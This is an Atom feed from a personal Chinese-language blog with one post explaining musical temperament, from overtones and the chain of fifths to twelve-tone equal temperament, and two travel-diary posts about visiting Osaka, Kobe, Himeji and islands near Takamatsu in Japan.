<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ihopenot</title>
  
  <subtitle>Brownian motion</subtitle>
  <link href="https://ihopenot.github.io/atom.xml" rel="self"/>
  
  <link href="https://ihopenot.github.io/"/>
  <updated>2024-01-15T16:27:54.000Z</updated>
  <id>https://ihopenot.github.io/</id>
  
  <author>
    <name>Ihopenot</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>乐律</title>
    <link href="https://ihopenot.github.io/2024/01/16/%E4%B9%90%E5%BE%8B/"/>
    <id>https://ihopenot.github.io/2024/01/16/%E4%B9%90%E5%BE%8B/</id>
    <published>2024-01-15T16:20:32.000Z</published>
    <updated>2024-01-15T16:27:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h1><p>首先音乐动听的原因是因为多个音之间的整体性与和谐性。某两个音之间和不和谐这个话题一听就非常主观，但是主观之下有某种共性存在。乐律实际就是探索这种共性，并且实际应用在乐器上的技术。</p><h1 id="声学"><a href="#声学" class="headerlink" title="声学"></a>声学</h1><p>首先定义一下声音，现在我们都知道声音是的本质是一种机械波，我们假设每一个单独的音就是某种简单的正弦波，那么决定一个音的关键因素就是<strong>频率</strong>，<strong>振幅</strong>和<strong>相位</strong>。由于人耳对相位不敏感，振幅可以简单理解为音量，我们这里主要讨论频率对于声音叠加的影响。</p><p>由于同种介质中声速是固定的，讨论频率实际上也是在讨论波长，两者是互为倒数的关系。</p><p>后面所有讨论都是基于<strong>波长</strong>进行的，这里假定所有讨论中的基础音波长是λ。</p><h2 id="二倍频"><a href="#二倍频" class="headerlink" title="二倍频"></a>二倍频</h2><p>定义一个<strong>八度</strong>是波长 λ 到 λ&#x2F;2 间的音程，即一个音的八度音频率正好是自己的<strong>两倍</strong>。<br>我们都知道一个音和自己的八度音是非常和谐的，比如键盘上的do和升do，因为频率正好是两倍的关系，所以波长更短的波能正好的嵌入波长的长的波中间，两者叠加之后波的频率与原本频率较低的波频率相同。或者换种说法，两种波周期的最小公倍数正好频率较低的那个波的周期，所以这两个音同时弹出来给人的听觉会非常和谐。</p><h2 id="自然泛音"><a href="#自然泛音" class="headerlink" title="自然泛音"></a>自然泛音</h2><p>当我们按下钢琴上一个do的时候，发出的声音并不是简单的正弦波，而是由很多泛音叠加而成的声音，泛音的组成和比例不同也是造成不同乐器之前音色不同的原因。<br>当琴弦发出一个波长为λ的波的时候，引起的泛音中最突出的几个点是波长为λ&#x2F;2，λ&#x2F;3，λ&#x2F;4，…这几个点，这些波的频率正好是基础音的2倍，3倍，4倍。这是泛音的倍频关系，也是自然界中发声的规律，所以叫做自然泛音。</p><p>所以可以简单理解为，当按下琴键发出基础音的时候，泛音会同时发出基础音频率整数倍的音，只不过这些音里面基础音是振幅最大的，后面的泛音振幅会一个比一个小。</p><p>自然泛音是非常和谐的声音，音律中所有理论基础都是基于自然泛音的。</p><h1 id="律制"><a href="#律制" class="headerlink" title="律制"></a>律制</h1><h2 id="三分损益法"><a href="#三分损益法" class="headerlink" title="三分损益法"></a>三分损益法</h2><p>从自然泛音中不难发现，当弦振动发出波长为λ的声音时，振幅最大的泛音是波长为λ&#x2F;2的波，这个音正好是基础音的高八度，所以一个音和自己的高八度是最和谐的。</p><p>继续观察第二泛音，振幅第二大的泛音是波长λ&#x2F;3的波，频率是基础音的三倍。三倍已经超过了一个八度的范围，因为一个八度正好是两倍，那么在基础音的八度音程内一定有一个对应的等位音，也就是频率是第二泛音一半的音，这个音的波长正好是2λ&#x2F;3。所以认为2λ&#x2F;3波长的音与基础音是非常和谐的，因为基础音发声时本身就包含了2&#x2F;3波长的音。</p><p>这一规律在公元前7世纪左右就被发现了，于是中国的管仲提出了三分损益法，即将一个弦等分成3分，去掉一份和添加一份发出的这两个音与原本的音是最和谐的。</p><p>去掉一份之后波长相当于变成2&#x2F;3，频率也就变成了3&#x2F;2倍，和之前上面的推论一致。添加一份之后波长相当于变成4&#x2F;3，频率变成了3&#x2F;4倍，归到同一个八度内实际上也是同一个音名。</p><p>第三泛音的频率是基础音的四倍，归到同一个八度内和基础音是同一个音名。在之后的是五倍的频率，归到同一个八度内的话实际上频率是基础音的5&#x2F;4，也就是波长是4λ&#x2F;5。从第三泛音往上走的泛音实际上对于声音本身影响已经比较小了，所以到这个阶段人们都在考虑2&#x2F;3波长的最和谐音，不过之后的纯律把4&#x2F;5这个比例也纳入了考虑。</p><h2 id="五度相生法"><a href="#五度相生法" class="headerlink" title="五度相生法"></a>五度相生法</h2><p>基于2&#x2F;3这个倍数，我们可以推导一个音阶内的所有音，因为2&#x2F;3正好是基础音和其纯五度音的倍数关系，所以这种推法叫做五度相生法。</p><p>既然波长为2λ&#x2F;3的音是与波长为λ的音最和谐的音，那么可以继续去找和波长为2λ&#x2F;3的音最和谐的音，也就是波长为4λ&#x2F;9的音，这个音波长已经小于λ&#x2F;2了，所以已经是下一个八度中的音了，把它重新调整回基础音所在的八度会得到波长为8λ&#x2F;9的音。</p><p>一直重复上面这个操作，如果我们进行到某一次操作之后得到的音和基础音能够在同一个八度内重合，那么我们可以认为遍历完了一个八度内所有的音阶。</p><p>理想是美好的，上面的问题可以等价为(2&#x2F;3)^x &#x3D;&#x3D; (1&#x2F;2)^y，其中x和y为正整数，求解这个方程。这个是无解的，所以上面的过程可以一直重复下去，也就是我们按照这样的想法无法遍历所有的音阶。</p><p>既然这样算不清楚那就取个近似吧，于是古人找到了(2&#x2F;3)^5≈0.1317和(1&#x2F;2)^3&#x3D;0.1250，这两个数很近似，于是就推五次吧。</p><p>最后各个音波长的结果是λ，2λ&#x2F;3，8λ&#x2F;9，16λ&#x2F;27，64λ&#x2F;81。最后第五次128λ&#x2F;243和λ&#x2F;2已经非常接近了。这个方法得出的五个音就是中国传统五声音调的宫 商 角 徵 羽。</p><p>西方的七声音阶就是在上面5个音的基础上加入了128λ&#x2F;243和3λ&#x2F;4。因为基础音是3λ&#x2F;4的音的2&#x2F;3波长的和谐音，所以也可以看作是从3λ&#x2F;4往后推7次得到的七声音阶，依赖的近似等式是(2&#x2F;3)^7≈0.0585和(1&#x2F;2)^4&#x3D;0.0652。最后结果是λ、8λ&#x2F;9、64λ&#x2F;81、3λ&#x2F;4、2λ&#x2F;3、16λ&#x2F;27、128λ&#x2F;243。不难发现相邻俩个音之间的比值只有两种，8&#x2F;9和243&#x2F;256，前者也叫全音，后者也叫半音。</p><h2 id="纯律"><a href="#纯律" class="headerlink" title="纯律"></a>纯律</h2><p>纯律出现一个原因是五度相生得到的七个音阶比例过于复杂了，而且每一个音只保证和前一个音和谐而不是和主音和谐，所以如果弹奏跨度特别大的音会有不和谐。所以有人提出了纯律，使七声音阶中的每一个音尽量与主音和谐，也就是和主音的比例关系变得尽量简单。</p><p>所以纯律中把4&#x2F;5波长的和谐音引入了整个音阶中。最后得出的七个音阶的波长分别是<br>λ、8&#x2F;9λ、4&#x2F;5λ、3&#x2F;4λ、2&#x2F;3λ、3&#x2F;5λ、8&#x2F;15λ。（这里有一个问题，为什么一定要保持7度，感觉破坏了对称性，还是说纯律本身其实是不止七度的？）</p><p>纯律引入了4&#x2F;5之后，同一个八度内的音确实更和谐了，但是带来了别的问题，原本同一个音阶里比例只有两种，现在变得更多了。而且每个音与主音是和谐了，但是两两之间又会出现不和谐。</p><h2 id="五度相生法-1"><a href="#五度相生法-1" class="headerlink" title="五度相生法"></a>五度相生法</h2><p>继续回到五度相生法，既然之前说的有误差，那就继续推，五次不够加到七次，七次不够加到十二次。</p><p>因为发现(2&#x2F;3)^12≈0.0077073，和(1&#x2F;2)^7&#x3D;0.0078125，所以又继续推导出12声音阶，波长分别是λ、2048&#x2F;2187λ、8&#x2F;9λ、16384&#x2F;19683λ、64&#x2F;81λ、3&#x2F;4λ、512&#x2F;729λ、2&#x2F;3λ、4096&#x2F;6561λ、16&#x2F;27λ、32768&#x2F;59049λ、128&#x2F;243λ。</p><p>原来七声音阶中的音都还在，只是新插进去了五个音在中间，这个时候再看下比例，现在比例也是两种，243:256（就是原来的“半音”，也叫作“自然半音”），2048:2187（这被叫作“变化半音”）。</p><p>这个时候得到的音阶已经几乎是一个等比数列了，但是最后一级总是会有一点误差。</p><p>之后还有人继续沿着五度相生法卷出来60律，360律，实际意义已经不大了。</p><p>说回误差，这十二阶中的误差看起来不大，但其实也不小。(2048:2187)&#x2F;(243:256)≈0.9865，好像差不多，但其实自然半音本身就是243:256≈0.9492了。</p><p>并且有误差存在的话会导致转调，合奏出现很多问题，下面这个图是纯律，但是五度相生也有一样的问题，就是C调转D调，总有几个音的音程由于误差对不上，导致后面的音全部错位，这样就会导致旋律听起来不同，合奏的时候也会不和谐。而且因为有的乐器本身不是C调的，如果和C调乐器一起合奏就烂完了。</p><img data-src="/2024/01/16/%E4%B9%90%E5%BE%8B/Pasted%20image%2020231228105133.png" class="" title="Pasted image 20231228105133"><p>而且由于五度相生法和纯律推出来的音阶都是基于基础音的。五度相生只保证链式的和谐，即我上一个音和我下一个音跟我是和谐的，但是如果两个音相距过远会导致这种和谐减弱。纯律只保证所有音和基础音的和谐度，除了基础音之外的两两之间可能出现相当不和谐的情况，比如历史上的狼音五度2，6。谱面上是纯五度，但是实际调律出来的音色相当不和谐。这样会导致2，无法和5，6同时和谐。因为有这种情况，甚至有人提出键盘上放两个2，弹2，5的时候用一个，弹2，6的时候用另一个。</p><p>因为这些乐律上的缺陷，所以古代作曲有很多制约，哪些音又不能一起用了，啥和弦又不能弹了，本质是由于乐律的缺陷导致的。很多人一直致力解决这个问题，试图找到一种方法解决误差的同时，又保证纯四度和纯五度不被破坏。</p><p>一直到文艺复兴之前，西方音乐界通行的律法叫“平均音调律”（Meantone temperament），就是在保证纯五度和纯四度尽量不受影响的前提下，把(2&#x2F;3)^12和(1&#x2F;2)^7之间的差距尽量分配到12个音上去。这只是一种无可奈何的妥协，大家其实都在等待新的音律出现。</p><h2 id="十二平均律"><a href="#十二平均律" class="headerlink" title="十二平均律"></a>十二平均律</h2><p>后来就出现了十二平均律，直接将2开12次方，真正把12音阶变成等比数列。这个乐律直接解决了转调问题，任何一个音都可以复制到另一个调上。</p><p>十二平均律的提出看起来想法很简单，但是实践起来要解决的问题是徒手开12次方的难题。现在普遍认为明朝的朱载堉是真正实现十二平均律的第一人，使用算珠开12次方，并且结果相当准确。</p><p>有了十二平均律，所有音之间的音程都是固定的半音，100音分，转调合奏问题统统解决了，有了这个音律，作曲家，乐器制造者都获得了极大的便利和自由。但是还是有一点不好，因为十二平均律破坏了最自然的纯五度和纯四度，甚至大三度，这些自然泛音和现在钢琴上弹出来的音总是有小小的误差，虽然基本上是可以接受的。</p><p>现在主流乐律还是十二平均律，但是包括印度，阿拉伯等特色乐律也不一定非要是十二平均律，十二平均律最核心还是三分损益法中提出的2&#x2F;3的和谐音，如果基于别的和谐可以派生出不同的乐律。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;核心思想&quot;&gt;&lt;a href=&quot;#核心思想&quot; class=&quot;headerlink&quot; title=&quot;核心思想&quot;&gt;&lt;/a&gt;核心思想&lt;/h1&gt;&lt;p&gt;首先音乐动听的原因是因为多个音之间的整体性与和谐性。某两个音之间和不和谐这个话题一听就非常主观，但是主观之下有某种共性存在。</summary>
      
    
    
    
    
    <category term="Music" scheme="https://ihopenot.github.io/tags/Music/"/>
    
  </entry>
  
  <entry>
    <title>赴日游记(四)</title>
    <link href="https://ihopenot.github.io/2024/01/15/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0-%E5%9B%9B/"/>
    <id>https://ihopenot.github.io/2024/01/15/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0-%E5%9B%9B/</id>
    <published>2024-01-15T15:25:40.000Z</published>
    <updated>2024-01-15T16:19:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日程"><a href="#日程" class="headerlink" title="日程"></a>日程</h1><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><p>今天去了高松，预计在这边的行程是男女木岛，直岛和小豆岛。主要的游玩地是在直岛上面的，有大量的summer pockets朝圣点，男木岛要少些，女木岛朝圣点最少，因为今天还要从大阪赶到高松，所以今天的目标只有女木岛。</p><p>坐jr一路做到高松，到酒店已经中午了，东西放好就在附近找了一家乌冬面吃，好像高松附近乌冬面特别有名。</p><img data-src='/2024/01/15/赴日游记-四//IMG20230730123943.jpg'  alt="IMG20230730123943" style="zoom:10%;" /><p>那个金黄色的我一开始以为是丸子啥的，结果完了发现是鹌鹑蛋，他这个乌冬的面里的牛肉还挺好吃的，但是我点的这个没汤，吃到最后又干又没味，最后也没吃完。。。</p><span id="more"></span><p>吃完之后直奔码头，住的酒店里码头特别近，出门就是高松港，买了女木岛往复的船票，然后等船。</p><img data-src='/2024/01/15/赴日游记-四//IMG20230730133827.jpg'  alt="IMG20230730133827" style="zoom:10%;" /><p>上面那个小绿豆好像是个什么吉祥物，这里好像有雌雄岛海运和四国海运运营，雌雄岛主要运男木岛女木岛，四国海运还运小豆岛，去小豆岛的船有好几艘联动船，有宝可梦联动的，有高木同学联动的。</p><p>等船也没等太久，日本这些船啊火车啊之类都是相当准点的，也要注意别玩过了最后一班船。实在玩过了好像可以坐那种私人的船回来，但是价格肯定不低就是了。</p><p>船上风景非常不错，海平面上可以看到很多岛，也包括了之后要去的好几个目的地。</p><p>女木岛在SP中的取景主要是和鸥这个角色相关，包括旧船在的洞穴就是在这座岛上。从船上靠近这座岛就能看出满满的鸥元素，建筑上面都是小海鸥。</p><img data-src='/2024/01/15/赴日游记-四//IMG20230730142140.jpg'  alt="IMG20230730142140" style="zoom:10%;" /><p>下船之后的这个建筑就是导游中心一样的存在，这里也有一个小型博物馆一样的东西。然后游客可以在这里直接坐bus去鬼鬼大洞窟，也就是SP中洞穴的取景点，车票好像是200还是500日元记不清了，建议要去鬼鬼大洞窟的都坐这个车。我和同学一开始走过去以为问题不大，顺便还可以欣赏一下风景，后来在途中被折磨了，进退维谷。主要后面的路都是山路，各种虫子飞，而且夏天又热，走到顶的时候人都快倒了。</p><p>出导游中心就看到的是一个帆船钢琴，假的。应该就是羽衣里他们修的船的原型，虽然并不在洞穴里。</p><img data-src='/2024/01/15/赴日游记-四//IMG20230730142833.jpg'  alt="IMG20230730142833" style="zoom:10%;" /><p>上面有个石板雕的谱子，是《琴声如诉》。</p><p>顺便我们来的时候好像正好赶上什么会社休假还是啥的，很多人在旁边的沙滩上游泳。之后再往后走就是上山了，去鬼鬼大洞窟。前一半的路程还算可以，山上眺望大海还挺美的，再往后走就越来越折磨，推荐后来人不要省那几百块，老老实实坐车上山。后来爬到快死掉了终于到顶了，赶紧找了个自动贩售机炫了一瓶可乐。然后感觉鬼鬼大洞窟去的人并不多，有个老大爷在卖票，进去之后发现就没有别的游客了，独享。</p><img data-src='/2024/01/15/赴日游记-四//IMG20230730151138.jpg'  alt="IMG20230730151138" style="zoom:10%;" /><p>这是入口，后来好像还在门口放了鸥的等身立牌，就像灯塔里的紬一样，不过我们去的时候还没有。鬼鬼大洞窟里也没啥东西，感觉唯一一点好就是非常凉快，让人在炎热的夏日不想离开。</p><img data-src='/2024/01/15/赴日游记-四//IMG20230730151532.jpg'  alt="IMG20230730151532" style="zoom:10%;" /><p>这是鬼的宝藏，据说鬼实际就是古时候的海盗，这个洞穴就是海盗的老巢，里面有什么审讯室，藏宝室之类的地方。</p><p>逛了一下之后又乘了会凉离开了，路过刚才卖票的老大爷还跟我们打招呼，大爷人还挺好的，给我们说下山的车票多少钱，什么时候有车。之后就坐车下山了，之后就直接回高松港了。后来才发现打卡少打了一个地方，就是原作里下山的BG，好像是路过了但是没意识到。</p><p>之后回到高松酒店已经晚上6点了，准备吃点什么，同学想吃吉野家，我感觉吉野家吃太多了，然后就分开吃了。路过烧鸟店看起来感觉不错但是最后没敢进去，最后在商店街找了家寿司吃。</p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><p>TODO</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;日程&quot;&gt;&lt;a href=&quot;#日程&quot; class=&quot;headerlink&quot; title=&quot;日程&quot;&gt;&lt;/a&gt;日程&lt;/h1&gt;&lt;h2 id=&quot;Day5&quot;&gt;&lt;a href=&quot;#Day5&quot; class=&quot;headerlink&quot; title=&quot;Day5&quot;&gt;&lt;/a&gt;Day5&lt;/h2&gt;&lt;p&gt;今天去了高松，预计在这边的行程是男女木岛，直岛和小豆岛。主要的游玩地是在直岛上面的，有大量的summer pockets朝圣点，男木岛要少些，女木岛朝圣点最少，因为今天还要从大阪赶到高松，所以今天的目标只有女木岛。&lt;/p&gt;
&lt;p&gt;坐jr一路做到高松，到酒店已经中午了，东西放好就在附近找了一家乌冬面吃，好像高松附近乌冬面特别有名。&lt;/p&gt;
&lt;img data-src=&#39;/2024/01/15/赴日游记-四//IMG20230730123943.jpg&#39;  alt=&quot;IMG20230730123943&quot; style=&quot;zoom:10%;&quot; /&gt;

&lt;p&gt;那个金黄色的我一开始以为是丸子啥的，结果完了发现是鹌鹑蛋，他这个乌冬的面里的牛肉还挺好吃的，但是我点的这个没汤，吃到最后又干又没味，最后也没吃完。。。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常" scheme="https://ihopenot.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>赴日游记(三)</title>
    <link href="https://ihopenot.github.io/2023/11/07/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0-%E4%B8%89/"/>
    <id>https://ihopenot.github.io/2023/11/07/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0-%E4%B8%89/</id>
    <published>2023-11-07T05:27:23.481Z</published>
    <updated>2023-11-07T05:27:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日程"><a href="#日程" class="headerlink" title="日程"></a>日程</h1><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><p>早上起来，决定去大阪城。</p><p>大阪城那里是个很大的像公园的地方，中间是大阪城，周围有很多配套设施，有些像音乐馆的地方，那个时候好像还在办什么活动，全是人，而且都拿着小团扇靠着墙不知道在拍什么东西。</p><p>往里稍微走一走就到大阪城周边了，应该说大阪城分三个部分，一个是最中心最高的天守阁，一个是周围护城河和墙围起来的日本风的环境，再外面是像现代公园的一个环境。进大阪城要过一个城门一样的东西。</p><span id="more"></span><img data-src='/2023/11/07/赴日游记-三//IMG20230728103641.jpg'  alt="IMG20230728103641" style="zoom:10%;" /><p>穿过门的时候，看到天守阁真的很震撼。有种拨开云雾之后宏伟的天守阁出现在眼前的那种感觉。拍了很多张照片都拍不出那种感觉。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728103755.jpg'  alt="IMG20230728103755" style="zoom:10%;" /><p>在之后逐渐靠近天守阁。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728104016.jpg'  alt="IMG20230728104016" style="zoom:10%;" /><img data-src='/2023/11/07/赴日游记-三//IMG20230728105752.jpg'  alt="IMG20230728105752" style="zoom:10%;" /><p>夏天真的热的要死，所幸日本自动贩卖机到处都是，而且里面的饮料都是冰的，挺好，路上干了好几瓶水。走到天守阁脚下发现进天守阁不仅要门票还要排队，队伍还很长一条，然后就打退堂鼓了，看下外面就差不多了吧。</p><p>后来还是进去了，排就排吧，好在队伍看起来很长，但是动的挺快的，排了可能不到半个小时就到了吧。门票是600円，是个自动售票机在卖票，支持很多支付方式，主要是支持微信支付宝，这是我在日本为数不多使用支付宝支付的服务之一。</p><p>拿了票进天守阁，门口放了一门炮，也不知道是真的还是假的，进去之后主要是历史文物和一些历史教育，主要是关于战国时期的一些东西，大阪城的历史啥的，五楼是专门讲丰臣秀吉的传记的。其中三楼还是四楼是不允许拍摄的，都是些文物啥的，但是里面本来也没啥好拍的，所以阁内都没拍。</p><p>然后到天守阁顶楼拍了一张，远处那个绿色扁平的圆就是之前说的像音乐馆的东西。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728121508.jpg'  alt="IMG20230728121508" style="zoom:10%;" /><p>之后从天守阁出来，直奔下一个目的地，心斋桥，找饭吃（</p><p>打算试试一兰拉面，然后找到了本店，然后发现门口的队伍巨长，然后放弃了。主要饿了，这排队不知道要排到啥时候去了，然后再附近晃，发现有个一兰拉面（清真）好像人不多的样子，然后打算去吃，有点队伍但是排的不久。是外面放了一个售票机，日本售票机的逻辑是先把钱塞进去，然后你点你要什么，点一下就出一张对应的票，之后用一个退币按钮把剩下的钱退回来。这个和国内大多数贩卖机不太一样，国内都是先按商品，选好之后再付款。但是日本也有这种逻辑的自动贩售机，那种大都是支持电子钱包支付的贩售机会有这种支付逻辑。</p><p>拿了票排队，等服务员引导入座。这家店的座位是每人一个座，然后座位之间都是挡板隔开的，座位正面就是服务员在的地方，就很像日本动漫或者电视里看的那种，但是它这里面向服务员的方向是被布遮住的，只有上菜或者请求服务的时候会打开。然后请求服务的话就是按桌子上一个键，对于常见的一些服务比如加面，加菜等等都有一个小牌子，上面有多国语言，你只要按下请求服务的按键，之后选你要的服务对应的小牌子放在前面，服务员看到小牌子就知道你要什么服务了，非常友好。值得一提的是，当时看了下小牌子，里面有一个是周围人太吵了，希望安静点。不知道这个用了会发生什么。</p><p>上座之后等不了多久就上菜了。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728140330.jpg'  alt="IMG20230728140330" style="zoom:10%;" /><p>加了两片海苔和一个温泉蛋，味道还不错，温泉蛋绝妙，和面很配。然后它这个清真的意思是，因为正统一兰是用的豚骨高汤，也就是猪骨，所以为了清真，他这个汤是换用的鸡汤，可能这也是人比较少的原因吧。虽然它招牌上写用鸡汤完美还原了豚骨高汤的味道，但是完全放屁，面吃进嘴就是一口鸡味。但是抛开不谈，就味道本身还是很不错的。</p><p>吃完之后又去日本桥走了一遭，昨天去的太晚店都关的差不多了，今天下午直接去，到了发现有的店还是没开，不会是开倒闭了吧。。但是也有挺多开了的店，什么骏河屋啥的，还有一个专卖各种卡牌的店，上面还有一整层楼给牌佬打牌，游戏王什么的，各种牌都有。还有些什么不知道是怎么玩的牌，感觉就像是小学生玩的那种只有个攻防的奥特曼卡牌的那种牌也有人在打，看不懂。还有那种一整个店全是手办，各种手办都有的。但是也没打算买啥，所以只是到处看了下，即使要买也是规划到最后几天去东京买，没人想提着一堆东西到处走吧。</p><p>逛的差不多了就去下一个目的地，通天阁。也在日本桥附近，直接走过去了，逐渐靠近通天阁。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728154854.jpg'  alt="IMG20230728154854" style="zoom:10%;" /><p>之后拍了张我觉得很有日本味的照片。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728160336.jpg'  alt="IMG20230728160336" style="zoom:10%;" /><p>然后到了通天阁脚下，通天阁是可以上去的，但是要1000日元，感觉有点亏，也不是非上不可，然后就没上。</p><p>逛的差不多之后去附近的唐吉可德转了一下，就是各种东西都卖的超市，买了瓶生可乐，一包芒果干，一包悠哈悠哈的糖，试试日本零食。那个糖挺便宜的，国内罗森也有卖，在日本均价是国内两倍的前提下，那个糖的价格和国内差不多。然后那个生可乐是我在日本买过的最便宜的饮料，一瓶不到一百日元，比水还便宜。然后坐地铁回酒店了，回酒店上楼的时候在自动贩卖机里炫了一罐asahi，苦的不好喝。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728171826.jpg'  alt="IMG20230728171826" style="zoom:10%;" /><p>然后开始考虑晚饭吃什么，到处晃了一圈也不知道吃啥，然后发现有个露天广场，上面有很多餐车在卖吃的，看了一下，有挺多东西的，什么蛋糕，什么生蚝啤酒，之类的各种食物，感觉还行。最后搞了个土耳其烤肉卷和长薯条。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728190309.jpg'  alt="IMG20230728190309" style="zoom:10%;" /><p>烤肉卷味道不错，薯条有点拉，感觉全是面粉，只有少量的土豆。这里露天环境还不错，边吃还有大屏幕在那放足球和棒球比赛。吃完天已经黑了，走时拍了张照。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728192939.jpg'  alt="IMG20230728192939" style="zoom:10%;" /><p>之后去了趟711，看到了300日元的冰杯。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230728193817.jpg'  alt="IMG20230728193817" style="zoom:10%;" /><p>之后回酒店看了会电视睡觉了。</p><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><p>今天的预定行程是去姬路和神户，去姬路看姬路城，去神户吃神户牛肉。</p><p>一大早直奔神户，到了之后也不早了，出车站的时候看到有个老志愿者在发什么东西，大概是看我们长得像外地人，又目的不太明确的样子，问我们需不需要帮助。然后去看了下，原来大爷是发神户导游的传单的，给外地游客指路。问了我们会说中文之后直接抄着一口中文跟我们介绍起来，很少有和外国人用中文交流的经验，大爷话说得还挺不错的。</p><p>指引了一下发了一小本导游手册，看了下，神户大部分都是山上的景和海边的景，基本上就是临海，然后就是山，这样的结构。但是没什么要去山上玩的，这次来神户就是为了吃牛肉。</p><p>但是离午饭还有一段时间，于是同学提议去北野异人馆，似乎在历史上是各个国家的外国人在的聚居区，然后现在给改成了一片有各国特色建筑风貌的一片建筑群。感觉也是个人造景观，去的主要原因是有一幢异人馆的fate里面远坂凛的家。</p><p>然后大爷给我们指了下路，我们就直奔过去了。然后在一个路口有个观光案内的一个小店面，想了想进去看看。店里只有一个阿姨，然后看到我们进去之后，先是给我们介绍了下北野异人馆的历史，之后是各个馆的位置，包括一些外观和内景的照片，还有一些这些地方的背景设定之类啥的。然后有一些门票服务，就是每个建筑单独参观各自的价格，还有捆绑销售，啥的，寻思了一下还是算了，就看看外面就行了。不得不说日本服务业确实好，之前的大爷和阿姨都非常和善，虽然我们最后啥门票也没买，阿姨还是微笑着和我们再见。搞的我有点尴尬了，好像不花点钱不太好。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729111512.jpg'  alt="IMG20230729111512" style="zoom:10%;" /><p>然后内景和外景是两个不同的建筑，内景是在别的建筑里面取的景。当然这些建筑都是可以进去参观的，即使之前没在观光案内那里买票也可以到建筑门口买票。但是由于要门票钱，寻思了下感觉里面也没有什么要看的就没进去了。</p><p>之后又在别的馆转了下，有些什么奥地利馆啥的啥的，有挺多免费参观的馆的。后面的山上还看见了一个神社，也上去参观了下，还看到几个国人老哥也在参观。</p><p>一点美景：</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729110350.jpg'  alt="IMG20230729110350" style="zoom:10%;" /><p>之后差不多到饭点就往回走了，找点吃的，到商业街上转了半天也不知道吃什么，说是吃牛肉但是最后看到价格有点心惊肉跳。最后晃了半天还是去吃了，到了门口告诉说门店没位置了，然后让人把我们带到另一个门面去吃，还要坐电梯到楼上，然后我们去的时候里面没人，看起来挺高档的。菜单拿来一看，最便宜的也要5000+日元，再上面都要上万了，哈人。点了份最便宜的牛肉套餐，花了6000+日元。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729122812.jpg'  alt="IMG20230729122812" style="zoom:10%;" /><p>差不多能吃饱，味道还可以，然后那个梅子酒确实好喝，配牛肉，嘶哈嘶哈。之后去街上又搞了个鲷鱼烧，便宜好吃。</p><p>之后去看神户大桥，路过一个商业街看到好像是海军什么东西在搞街头音乐，还挺热闹的。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729131358.jpg'  alt="IMG20230729131358" style="zoom:10%;" /><p>之后到神户大桥，不得不说海边真是扑面而来的海的味道，还有海风，非常舒服。神户大桥在fate里面也是有出现的，就是冬木市大桥的原型。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729135259.jpg'  alt="IMG20230729135259" style="zoom:10%;" /><p>之后去了姬路，去看姬路城，一路没有什么值得说的。到了之后从姬路的JR车站出来，到姬路城之间，是一条长长的商业街。沿着路走能体会到姬路城由小变大，逐渐清晰的一个过程，但是街上本身没什么人，就感觉日本除了京都，东京这些大城市，其实像神户，姬路这种人都不太多的样子。</p><p>姬路城整个附属建筑群的规模感觉不如大阪城，但是洁白的天守阁又有另一种感觉，可以我们来的时间是夏天，如果春天来的话，赶上樱花的花期应该是会非常美丽的。夏天就只有绿油油的樱花树叶，感觉总是少了点什么。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729161501.jpg'  alt="IMG20230729161501" style="zoom:10%;" /><p>可以手动脑补下把绿叶换成粉红色的花团是什么风景。</p><p>进场也需要门票，转头就走了。回去的时候去明石看了下明石海峡大桥，非常壮观。</p><img data-src='/2023/11/07/赴日游记-三//IMG20230729180832.jpg'  alt="IMG20230729180832" style="zoom:10%;" /><p>晚上在海边走了半天不知道吃啥，最后回酒店附近找了家麦当劳吃了。</p><p>跑了一天，之后就坐车回酒店躺了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;日程&quot;&gt;&lt;a href=&quot;#日程&quot; class=&quot;headerlink&quot; title=&quot;日程&quot;&gt;&lt;/a&gt;日程&lt;/h1&gt;&lt;h2 id=&quot;Day3&quot;&gt;&lt;a href=&quot;#Day3&quot; class=&quot;headerlink&quot; title=&quot;Day3&quot;&gt;&lt;/a&gt;Day3&lt;/h2&gt;&lt;p&gt;早上起来，决定去大阪城。&lt;/p&gt;
&lt;p&gt;大阪城那里是个很大的像公园的地方，中间是大阪城，周围有很多配套设施，有些像音乐馆的地方，那个时候好像还在办什么活动，全是人，而且都拿着小团扇靠着墙不知道在拍什么东西。&lt;/p&gt;
